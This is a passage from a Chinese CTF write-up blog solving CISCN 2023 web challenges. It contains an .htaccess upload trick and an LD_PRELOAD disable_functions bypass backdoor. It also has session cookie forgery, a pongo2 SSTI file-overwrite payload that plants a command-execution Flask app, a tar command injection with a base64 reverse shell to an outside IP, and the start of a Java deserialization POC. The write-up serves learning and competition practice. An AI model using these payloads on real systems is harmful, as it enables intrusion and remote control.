<p>重点就是上面这一块儿，这里的代码逻辑就是：黑名单限制我们的文件后缀，然后就不管了，其余的任何文件后缀都认为是正确的。那我们肯定就能利用.htaccess来进行文件上传了，文件内容如下：</p>
<pre><code class="hljs scss">&lt;FilesMatch "<span class="hljs-number">1</span><span class="hljs-selector-class">.jpg</span>"&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;</code></pre>
<p>这里指定的文件名可以随便，上传之后会发现没有权限去读取flag。这里就靠wp了，他们做这道题都是线下awd的模式，因此他们直接先是用自动化工具审计了一下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302155435429.png" alt="image-20240302155435429"></p>
<p>我们可以看到第三个箭头处的似乎是一个后门文件（对我这个小白来说我不知道为何后门文件直接就在源码里）</p>
<p>我们根据路径看一下该文件，</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;

    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"cmd"</span>];
    <span class="hljs-variable">$out_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"outpath"</span>];
    <span class="hljs-variable">$evil_cmdline</span> = <span class="hljs-variable">$cmd</span> . <span class="hljs-string">" &gt; "</span> . <span class="hljs-variable">$out_path</span> . <span class="hljs-string">" 2&gt;&amp;1"</span>;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . <span class="hljs-variable">$evil_cmdline</span> . <span class="hljs-string">"&lt;/p&gt;"</span>;

    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">"EVIL_CMDLINE="</span> . <span class="hljs-variable">$evil_cmdline</span>);

    <span class="hljs-variable">$so_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"sopath"</span>];
    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">"LD_PRELOAD="</span> . <span class="hljs-variable">$so_path</span>);

    <span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">""</span>, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>);

    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . <span class="hljs-title function_ invoke__">nl2br</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$out_path</span>)) . <span class="hljs-string">"&lt;/p&gt;"</span>; 

    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$out_path</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里给出GPT对该文件内容的解释</p>
<pre><code class="hljs scss">这段 PHP 代码实现了一个简单的利用 LD_PRELOAD 绕过 disable_functions 的方法。具体来说，它的功能是执行一个命令，并将命令的输出重定向到指定文件中，然后再读取该文件的内容并显示出来。下面是代码的详细解析：

<span class="hljs-number">1</span>. 第一行通过 GET 请求接收三个参数：cmd（要执行的命令）、outpath（输出文件路径）和 sopath（要加载的共享库路径）。

<span class="hljs-number">2</span>. 接下来将接收到的 cmd 参数和 outpath 参数拼接成一个命令行字符串 evil_cmdline，其中包括将命令的输出重定向到指定文件的部分。

<span class="hljs-number">3</span>. 使用 putenv 函数将 EVIL_CMDLINE 环境变量设置为 evil_cmdline。这样在后续的 mail 函数调用中，mail 函数会在执行时加载 EVIL_CMDLINE 环境变量中的命令。

<span class="hljs-number">4</span>. 将接收到的 sopath 参数设置为 LD_PRELOAD 环境变量，以加载共享库文件。这个共享库文件通常用于重载系统调用，以实现特定功能，比如绕过 disable_functions。

<span class="hljs-number">5</span>. 调用 mail 函数发送一封空邮件。由于在设置 LD_PRELOAD 环境变量后调用 mail 函数，因此 mail 函数在执行时会加载 LD_PRELOAD 环境变量中指定的共享库，从而执行设置的命令。

<span class="hljs-number">6</span>. 最后通过读取输出文件的内容，并以 <span class="hljs-selector-tag">HTML</span> 格式显示出来。同时使用 unlink 函数删除输出文件，以保证安全性。

这段代码的主要目的是演示利用 LD_PRELOAD 和重定向输出来绕过 PHP 的 disable_functions 的方法，同时也展示了一个非常不安全的代码实现。</code></pre>
<p>结合上述PHP文件我们能知道payload为：不过这里的路径与nssctf环境下不一致，需要做出修改</p>
<pre><code class="hljs scss">echo "&lt;<span class="hljs-selector-tag">p</span>&gt; &lt;<span class="hljs-selector-tag">b</span>&gt;example&lt;/<span class="hljs-selector-tag">b</span>&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;<span class="hljs-string">";</span>
<span class="hljs-string">//</span>
<span class="hljs-string">echo "</span>&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/app/bootstrap/test/bypass_disablefunc_x64.so &lt;/p&gt;<span class="hljs-string">";</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302160351776.png" alt="image-20240302160351776"></p>
<p>这里的flag在环境变量中</p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44640313/article/details/131757347">2023西南赛区ciscn – do you like read</a></p>
<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/06/13/ciscn%E8%A5%BF%E5%8D%97%E5%A4%8D%E8%B5%9Bawdp-web/">CISCN西南复赛AWDPlus Web</a></p>
<h1 id="ciscn-2023-初赛go_session">[CISCN 2023 初赛]go_session</h1>
<h2 id="前置说明">前置说明</h2>
<p>这里借用师傅对该试题框架的说明</p>
<p>下载题目的附件，是用go的gin框架写的后端，cookie-session是由gorilla/sessions来实现，而sessions库使用了另一个库：gorilla/securecookie来实现对cookie的安全传输。这里所谓的安全传输，是指保证cookie中的值不能被看出来（通过加密实现，可选）、保证传输的cookie不会被篡改。</p>
<p>securecookie的编码函数一共有四个主要步骤来实现这一目的：</p>
<ul>
<li>序列化，cookie的值可以有多种形式，首先将其序列化为字节切片，方便后续操作。</li>
<li>加密（这一步是可选的），使用指定的对称加密方法、加密密钥，进行对value进行加密。</li>
<li>计算MAC值，以保证不被篡改，这里的MAC是Message Authentication Code的缩写。如何计算呢，通过指定的哈希函数来计算，对上述的加密后的value求一个摘要。</li>
<li>base64编码，当解密时，反过来即可，因为上述用于加密的方法与加密密钥、用于认证的哈希方法与哈希密钥，都是在服务器端设置的。准确来说就是由这个securecookie库的SecureCookie接口所规定的，通过加密密钥与认证密钥，保证了cookie不会被解密、不会被篡改的两个目的。</li>
</ul>
<h2 id="代码审计">代码审计</h2>
<p>main.go</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"github.com/gin-gonic/gin"</span>
	<span class="hljs-string">"main/route"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	r := gin.Default()
	r.GET(<span class="hljs-string">"/"</span>, route.Index)
	r.GET(<span class="hljs-string">"/admin"</span>, route.Admin)
	r.GET(<span class="hljs-string">"/flask"</span>, route.Flask)
	r.Run(<span class="hljs-string">"0.0.0.0:80"</span>)
}</code></pre>
<p>index路由的处理</p>
<pre><code class="hljs go"><span class="hljs-keyword">var</span> store = sessions.NewCookieStore([]<span class="hljs-type">byte</span>(os.Getenv(<span class="hljs-string">"SESSION_KEY"</span>)))

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Index</span><span class="hljs-params">(c *gin.Context)</span></span> {
	session, err := store.Get(c.Request, <span class="hljs-string">"session-name"</span>)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}
	<span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">"name"</span>] == <span class="hljs-literal">nil</span> {
		session.Values[<span class="hljs-string">"name"</span>] = <span class="hljs-string">"guest"</span>
		err = session.Save(c.Request, c.Writer)
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
			<span class="hljs-keyword">return</span>
		}
	}

	c.String(<span class="hljs-number">200</span>, <span class="hljs-string">"Hello, guest"</span>)
}</code></pre>
<p>首先是靠SESSION_KEY环境变量的key对session加密，接着判断session中的name键值是否为空，如果是空的话，赋值为guest。但不论name值如何，这里最后回显都是Hello, guest</p>
<p>Admin路由：</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Admin</span><span class="hljs-params">(c *gin.Context)</span></span> {
	session, err := store.Get(c.Request, <span class="hljs-string">"session-name"</span>)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}
	<span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">"name"</span>] != <span class="hljs-string">"admin"</span> {
		http.Error(c.Writer, <span class="hljs-string">"N0"</span>, http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}
	name := c.DefaultQuery(<span class="hljs-string">"name"</span>, <span class="hljs-string">"ssti"</span>)
	xssWaf := html.EscapeString(name)<span class="hljs-comment">//防止xss</span>
	tpl, err := pongo2.FromString(<span class="hljs-string">"Hello "</span> + xssWaf + <span class="hljs-string">"!"</span>)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		<span class="hljs-built_in">panic</span>(err)
	}
	out, err := tpl.Execute(pongo2.Context{<span class="hljs-string">"c"</span>: c})
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}
	c.String(<span class="hljs-number">200</span>, out)
}</code></pre>
<p>这里判断session的name是否为admin，如果不是则返回500，之后获取url中name的值，如果没有则默认为ssti</p>
<p>之后通过pongo2框架进行渲染</p>
<p>Flask路由</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Flask</span><span class="hljs-params">(c *gin.Context)</span></span> {
	session, err := store.Get(c.Request, <span class="hljs-string">"session-name"</span>)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}
	<span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">"name"</span>] == <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			http.Error(c.Writer, <span class="hljs-string">"N0"</span>, http.StatusInternalServerError)
			<span class="hljs-keyword">return</span>
		}
	}
	resp, err := http.Get(<span class="hljs-string">"http://127.0.0.1:5000/"</span> + c.DefaultQuery(<span class="hljs-string">"name"</span>, <span class="hljs-string">"guest"</span>))
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span>
	}
	<span class="hljs-keyword">defer</span> resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	c.String(<span class="hljs-number">200</span>, <span class="hljs-type">string</span>(body))
}</code></pre>
<p>判断session的name是否为空，如果为空则返回500；之后向本地的5000端口发送get请求，最后将响应的信息输出</p>
<h2 id="session伪造">session伪造</h2>
<p>我们需要进行伪造的原因是，只有session中的name值为admin的时候我们才能利用pongo2的ssti漏洞进行rce</p>
<p>经过wp的参考：由于没有找到session-key泄露的点，因此会尝试去爆破key或者猜测从key就是空。</p>
<p>这里他们猜测为空的原因是：<strong>试了一会发现 <code>os.Getenv</code> 如果获取不存在的环境变量就会返回空值</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302183654650.png" alt="image-20240302183654650"></p>
<p>这里可以做出如上图所示的修改，随后运行，在F12中找到cookie</p>
<pre><code class="hljs scss">MTcwOTM3NTc4NHxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXw8FvDB_aTI-<span class="hljs-number">00</span>gfsWKaEOxC_DgmOTwM0DX2_DSD_NxBQ==</code></pre>
<p>之后我们复制cookie覆盖原有数据包中的cookie即可，如下图成功伪造</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302183729913.png" alt="image-20240302183729913"></p>
<p>接下来访问flask路由，这里师傅们是对flask的name进行畸形传参而引发报错（但我不太懂为何）这里将name赋值为空即可报错</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302184014372.png" alt="image-20240302184014372"></p>
<p>将报错的源码，复制到一个html上打开即可，如下图找到对应的app源码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302184235328.png" alt="image-20240302184235328"></p>
<p>注意到这里debug开启了，根据师傅们所说：这就表明，Flask框架是热加载的，server.py发生改变，程序也会更新，可以利用admin路由执行Go代码去覆盖掉server.py实现rce，XssWaf会转义双引号，可以通过UA和Referer绕过传参</p>
<p>我们知道pongo2模板引擎存在注入点，可以执行go的代码，<a target="_blank" rel="noopener" href="http://xn--server-9o7il2da3e1ftwn5utlksk9cpva595b329e9gxd.py">所以我们可以先上传文件覆盖server.py</a>，再访问<code>/flask</code>路由，来执行命令</p>
<h2 id="构造payload">构造payload</h2>
<p>这里就是知识盲区了。。。</p>
<p>使用gin包的SaveUploadedFile()进行文件上传</p>
<pre><code class="hljs scss">func (c *Context) <span class="hljs-built_in">SaveUploadedFile</span>(file *multipart.FileHeader, dst string) error</code></pre>
<ul>
<li>第一个获取表单中的文件，第二个参数为保存的目录</li>
</ul>
<p>所以使用ssti的payload为</p>
<pre><code class="hljs scss">{{c<span class="hljs-selector-class">.SaveUploadedFile</span>(c.FormFile("file"),"/app/server<span class="hljs-selector-class">.py</span>")}}</code></pre>
<p>但是我们在前面代码审计的时候知道，双引号会被html.EscapeString转义进行编码，所以需要绕过</p>
<p>我们利用gin中的Context.HandlerName()</p>
<blockquote>
<p>HandlerName<br>
返回主处理程序的名称。例如，如果处理程序是“handleGetUsers()”，此函数将返回“main.handleGetUsers”</p>
</blockquote>
<p>所以如果是在Admin()里，返回的就是main/route.Admin，然后配合过滤器last获取到最后一个字符串也就是文件名为n</p>
<p>还有一个Context.Request.Referer()Request.Referer：返回header里的Referer的值</p>
<p>我们可以在请求中的Referer的值添加为/app/server.py，所以构造最终payload</p>
<pre><code class="hljs scss">{{c<span class="hljs-selector-class">.SaveUploadedFile</span>(c.FormFile(c.HandlerName()|last),c<span class="hljs-selector-class">.Request</span><span class="hljs-selector-class">.Referer</span>())}</code></pre>
<p>但是在数据包中添加请求头时还要添加 Content-Type 头</p>
<pre><code class="hljs scss"><span class="hljs-attribute">Content</span>-Type: multipart/form-data; boundary=--<span class="hljs-attr">--WebKitFormBoundary8ALIn5Z2C3VlBqND</span></code></pre>
<p>对于添加这个头的解释是</p>
<blockquote>
<p>对表单提交，浏览器会自动设置合适的 Content-Type 请求，同时 生成一个唯一的边界字符串，并在请求体中使用这个边界字符串将表单字段和文件进行分隔。如果表单中包含文件上传的功能，需要 使用 multipart/form-data 类型的请求体格式。</p>
</blockquote>
<p>注意分隔符的开始和结束格式</p>
<pre><code class="hljs scss">--分隔符
...
...
--分隔符--</code></pre>
<p><a target="_blank" rel="noopener" href="http://xn--server-2d7o590j.py">覆盖server.py</a>，访问./admin，数据包如下</p>
<pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/admin?name={{c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())}}</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node5.anna.nssctf.cn:28661
<span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>/app/server.py
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND
<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session-name=MTcwOTM3NTc4NHxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXw8FvDB_aTI-00gfsWKaEOxC_DgmOTwM0DX2_DSD_NxBQ==
<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>423

<span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8ALIn5Z2C3VlBqND</span></span>
<span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>="n"; filename="1.py"</span>
<span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain</span>
<span class="language-pgsql"></span>
<span class="language-pgsql"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *</span>
<span class="language-pgsql"><span class="hljs-keyword">import</span> os</span>
<span class="language-pgsql">app = Flask(__name__)</span>
<span class="language-pgsql"></span>
<span class="language-pgsql">@app.route(<span class="hljs-string">'/'</span>)</span>
<span class="language-pgsql">def <span class="hljs-keyword">index</span>():</span>
<span class="language-pgsql">    <span class="hljs-type">name</span> = request.args[<span class="hljs-string">'name'</span>]</span>
<span class="language-pgsql">    file=os.popen(<span class="hljs-type">name</span>).<span class="hljs-keyword">read</span>()</span>
<span class="language-pgsql">    <span class="hljs-keyword">return</span> file</span>
<span class="language-pgsql"></span>
<span class="language-pgsql"><span class="hljs-keyword">if</span> __name__ == "__main__":</span>
<span class="language-pgsql">    app.run(host="0.0.0.0", port=<span class="hljs-number">5000</span>, <span class="hljs-keyword">debug</span>=<span class="hljs-keyword">True</span>)</span>
<span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8ALIn5Z2C3VlBqND--</span></span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302185908905.png" alt="image-20240302185908905"></p>
<p>成功上传，然后就在<code>./flask</code>去命令执行，因为我们知道该路由获取name是c.DefaultQuery，因此需要构造</p>
<pre><code class="hljs scss">?name=?name=env<span class="hljs-comment">//这样拼接以后才是http://127.0.0.1:5000/?name=env</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302190036705.png" alt="image-20240302190036705"></p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73512445/article/details/134261219">[CISCN 2023 初赛]go_session</a></p>
<p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/2304996.html">2023 CISCN 初赛 Web Writeup</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/V3g3t4ble/p/17515493.html">[CISCN 2023 初赛]go_session</a></p>
<h1 id="ciscn-2023-华北pysym">[CISCN 2023 华北]pysym</h1>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, send_from_directory
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> string
app = Flask(__name__)
app.config[<span class="hljs-string">'UPLOAD_FOLDER'</span>]=<span class="hljs-string">'uploads'</span> <span class="hljs-comment">#定义上传路径</span>
<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span>, methods=[<span class="hljs-string">'GET'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>)
<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span>,methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">POST</span>():
    <span class="hljs-comment">#判断是否有文件存在</span>
    <span class="hljs-keyword">if</span> <span class="hljs-string">'file'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:
        <span class="hljs-keyword">return</span> <span class="hljs-string">'No file uploaded.'</span>
    file = request.files[<span class="hljs-string">'file'</span>]
    <span class="hljs-comment">#判断文件大小</span>
    <span class="hljs-keyword">if</span> file.content_length &gt; <span class="hljs-number">10240</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">'file too lager'</span>
    <span class="hljs-comment">#生成上传路径</span>
    path = <span class="hljs-string">''</span>.join(random.choices(string.hexdigits, k=<span class="hljs-number">16</span>))
    <span class="hljs-comment">#生成最终上传路径,拼接uploads</span>
    directory = os.path.join(app.config[<span class="hljs-string">'UPLOAD_FOLDER'</span>], path)
    <span class="hljs-comment">#创建文件夹</span>
    os.makedirs(directory, mode=<span class="hljs-number">0o755</span>, exist_ok=<span class="hljs-literal">True</span>)
    <span class="hljs-comment">#生成最终文件的保存路径</span>
    savepath=os.path.join(directory, file.filename)
    file.save(savepath)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment">#对指定文件解压到指定目录</span>
     os.system(<span class="hljs-string">'tar --absolute-names  -xvf {} -C {}'</span>.<span class="hljs-built_in">format</span>(savepath,directory))
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">'something wrong in extracting'</span>

    links = []
    <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(directory):
        <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> files:
            extractedfile =os.path.join(root, name)
            <span class="hljs-comment">#检查是否存在符号链接</span>
            <span class="hljs-keyword">if</span> os.path.islink(extractedfile):
                os.remove(extractedfile)
                <span class="hljs-keyword">return</span> <span class="hljs-string">'no symlink'</span>
            <span class="hljs-comment">#检查是否为目录</span>
            <span class="hljs-keyword">if</span>  os.path.isdir(path) :
                <span class="hljs-keyword">return</span> <span class="hljs-string">'no directory'</span>
            links.append(extractedfile)
    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>,links=links)
<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">"/uploads/&lt;path:path&gt;"</span>,methods=[<span class="hljs-string">'GET'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">path</span>):
    <span class="hljs-comment">#下载文件</span>
    filepath = os.path.join(app.config[<span class="hljs-string">'UPLOAD_FOLDER'</span>], path)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(filepath):
        <span class="hljs-keyword">return</span> <span class="hljs-string">'404'</span>, <span class="hljs-number">404</span>
    <span class="hljs-keyword">return</span> send_from_directory(app.config[<span class="hljs-string">'UPLOAD_FOLDER'</span>], path)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>,port=<span class="hljs-number">1337</span>)</code></pre>
<p>经分析，上述的<code>os.system('tar --absolute-names  -xvf {} -C {}'.format(savepath,directory))</code></p>
<p>这一处代码的savepath可控，可造成rce</p>
<p>先通过 <strong>|</strong> 连接符号绕过，再用反弹指令进行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=base64%E7%BC%96%E7%A0%81&amp;spm=1001.2101.3001.7020">base64编码</a>绕过一些特殊字符的过滤。</p>
<pre><code class="hljs bash">test.tar | <span class="hljs-built_in">echo</span> bash -c <span class="hljs-string">'bash -i &gt;&amp; /dev/tcp/124.220.233.26/8888  0&gt;&amp;1'</span> | <span class="hljs-built_in">base64</span> -d | bash |
<span class="hljs-comment">#base64编码</span>
test.tar | <span class="hljs-built_in">echo</span> YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi84ODg4ICAwPiYxJw== | <span class="hljs-built_in">base64</span> -d | bash |</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302202119148.png" alt="image-20240302202119148"></p>
<p>发送之前记得开启监听</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302202133493.png" alt="image-20240302202133493"></p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/NYG694/article/details/136057868">CISCN往届国赛复现</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44558805/article/details/131456350">ciscn2023华北赛区</a></p>
<h1 id="ciscn-2023-初赛deserbug">[CISCN 2023 初赛]DeserBug</h1>
<p>找了几篇文章，都是基本直接给出答（都是老手了，不屑于），Java没做过几次，就是个菜鸟，这里下去补，直接给出答案了，今后学会再说。</p>
<p>这道题是Java经典CC链的翻版：</p>
<pre><code class="hljs java"><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;

<span class="hljs-keyword">import</span> javax.xml.transform.Templates;
<span class="hljs-keyword">import</span> java.util.Base64;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> com.app.Tools.getBytes;
<span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> com.app.Tools.setFieldValue;
<span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> com.app.Tools.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">POC</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">byte</span>[] bytes = getBytes(<span class="hljs-string">"Evil"</span>);
        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();
        setFieldValue(templates, <span class="hljs-string">"_name"</span>, <span class="hljs-string">"Sentiment"</span>);
